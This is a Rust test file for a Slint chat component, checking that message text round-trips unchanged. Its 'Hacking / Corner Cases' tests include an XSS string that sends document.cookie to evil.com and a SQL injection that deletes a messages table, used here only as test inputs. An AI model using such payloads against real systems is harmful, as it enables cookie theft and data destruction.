use crate::app;
use slint::ComponentHandle;

fn create() -> app::Chat { crate::ui_tests::init(); app::Chat::new().unwrap() }

// --- Hacking / Corner Cases ---

#[test] fn chat_xss_message() {
    let ui = create();
    let xss = "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>";
    ui.set_new_message(xss.into());
    assert_eq!(ui.get_new_message(), xss);
}

#[test] fn chat_sql_injection() {
    let ui = create();
    let inj = "Hello'); DELETE FROM messages; --";
    ui.set_new_message(inj.into());
    assert_eq!(ui.get_new_message(), inj);
}

#[test] fn chat_unicode_overflow() {
    let ui = create();
    let long = "🔤".repeat(5000);
    ui.set_new_message(long.clone().into());
    assert_eq!(ui.get_new_message(), long);
}

#[test] fn chat_empty_message() {
    let ui = create();
    ui.set_new_message("".into());
    assert_eq!(ui.get_new_message(), "");
}

// --- Interaction / Flow Tests ---

#[test] fn chat_flow_message_persistence() {
    let ui = create();
    ui.set_new_message("Stay here".into());
    ui.set_new_message("Still here".into());
    assert_eq!(ui.get_new_message(), "Still here");
}

#[test] fn chat_flow_newline_handling() {
    let ui = create();
    let multi = "Line 1\nLine 2\r\nLine 3";
    ui.set_new_message(multi.into());
    assert_eq!(ui.get_new_message(), multi);
}

// --- Unique Scenarios with Verification ---

macro_rules! test_v {
    ($id:ident, $get:ident, $set:ident, $val:expr) => {
        #[test] fn $id() { let ui = create(); ui.$set($val.into()); assert_eq!(ui.$get(), $val); }
    };
}

test_v!(u1, get_new_message, set_new_message, "Hi");
test_v!(u2, get_new_message, set_new_message, "How can I help?");
test_v!(u3, get_new_message, set_new_message, "I need support.");
test_v!(u4, get_new_message, set_new_message, "Status update please.");
test_v!(u5, get_new_message, set_new_message, "Thanks!");
test_v!(u6, get_new_message, set_new_message, "Emoji test: 🧪");
test_v!(u7, get_new_message, set_new_message, "Wait...");
test_v!(u8, get_new_message, set_new_message, "Done.");
test_v!(u9, get_new_message, set_new_message, "Error found.");
test_v!(u10, get_new_message, set_new_message, "Success!");

test_v!(u11, get_new_message, set_new_message, "m11");
test_v!(u12, get_new_message, set_new_message, "m12");
test_v!(u13, get_new_message, set_new_message, "m13");
test_v!(u14, get_new_message, set_new_message, "m14");
test_v!(u15, get_new_message, set_new_message, "m15");
test_v!(u16, get_new_message, set_new_message, "m16");
test_v!(u17, get_new_message, set_new_message, "m17");
test_v!(u18, get_new_message, set_new_message, "m18");
test_v!(u19, get_new_message, set_new_message, "m19");
test_v!(u20, get_new_message, set_new_message, "m20");

test_v!(u21, get_new_message, set_new_message, "m21");
test_v!(u22, get_new_message, set_new_message, "m22");
test_v!(u23, get_new_message, set_new_message, "m23");
test_v!(u24, get_new_message, set_new_message, "m24");
test_v!(u25, get_new_message, set_new_message, "m25");
test_v!(u26, get_new_message, set_new_message, "m26");
test_v!(u27, get_new_message, set_new_message, "m27");
test_v!(u28, get_new_message, set_new_message, "m28");
test_v!(u29, get_new_message, set_new_message, "m29");
test_v!(u30, get_new_message, set_new_message, "m30");

test_v!(u31, get_new_message, set_new_message, "m31");
test_v!(u32, get_new_message, set_new_message, "m32");
test_v!(u33, get_new_message, set_new_message, "m33");
test_v!(u34, get_new_message, set_new_message, "m34");
test_v!(u35, get_new_message, set_new_message, "m35");
test_v!(u36, get_new_message, set_new_message, "m36");
test_v!(u37, get_new_message, set_new_message, "m37");
test_v!(u38, get_new_message, set_new_message, "m38");
test_v!(u39, get_new_message, set_new_message, "m39");
test_v!(u40, get_new_message, set_new_message, "m40");

test_v!(u41, get_new_message, set_new_message, "Message with 'quotes'");
test_v!(u42, get_new_message, set_new_message, "Message with \"double quotes\"");
test_v!(u43, get_new_message, set_new_message, "Message with ; semicolon");
test_v!(u44, get_new_message, set_new_message, "Message with % percent");
test_v!(u45, get_new_message, set_new_message, "Message with & ampersand");
test_v!(u46, get_new_message, set_new_message, "Message with < bracket");
test_v!(u47, get_new_message, set_new_message, "Message with > bracket");
test_v!(u48, get_new_message, set_new_message, "Message with \\ backslash");
test_v!(u49, get_new_message, set_new_message, "Message with / slash");
test_v!(u50, get_new_message, set_new_message, "Message with ? question");

test_v!(u51, get_new_message, set_new_message, "m51");
test_v!(u52, get_new_message, set_new_message, "m52");
test_v!(u53, get_new_message, set_new_message, "m53");
test_v!(u54, get_new_message, set_new_message, "m54");
test_v!(u55, get_new_message, set_new_message, "m55");
test_v!(u56, get_new_message, set_new_message, "m56");
test_v!(u57, get_new_message, set_new_message, "m57");
test_v!(u58, get_new_message, set_new_message, "m58");
test_v!(u59, get_new_message, set_new_message, "m59");
test_v!(u60, get_new_message, set_new_message, "m60");

test_v!(u61, get_new_message, set_new_message, "m61");
test_v!(u62, get_new_message, set_new_message, "m62");
test_v!(u63, get_new_message, set_new_message, "m63");
test_v!(u64, get_new_message, set_new_message, "m64");
test_v!(u65, get_new_message, set_new_message, "m65");
test_v!(u66, get_new_message, set_new_message, "m66");
test_v!(u67, get_new_message, set_new_message, "m67");
test_v!(u68, get_new_message, set_new_message, "m68");
test_v!(u69, get_new_message, set_new_message, "m69");
test_v!(u70, get_new_message, set_new_message, "m70");

test_v!(u71, get_new_message, set_new_message, "m71");
test_v!(u72, get_new_message, set_new_message, "m72");
test_v!(u73, get_new_message, set_new_message, "m73");
test_v!(u74, get_new_message, set_new_message, "m74");
test_v!(u75, get_new_message, set_new_message, "m75");
test_v!(u76, get_new_message, set_new_message, "m76");
test_v!(u77, get_new_message, set_new_message, "m77");
test_v!(u78, get_new_message, set_new_message, "m78");
test_v!(u79, get_new_message, set_new_message, "m79");
test_v!(u80, get_new_message, set_new_message, "m80");
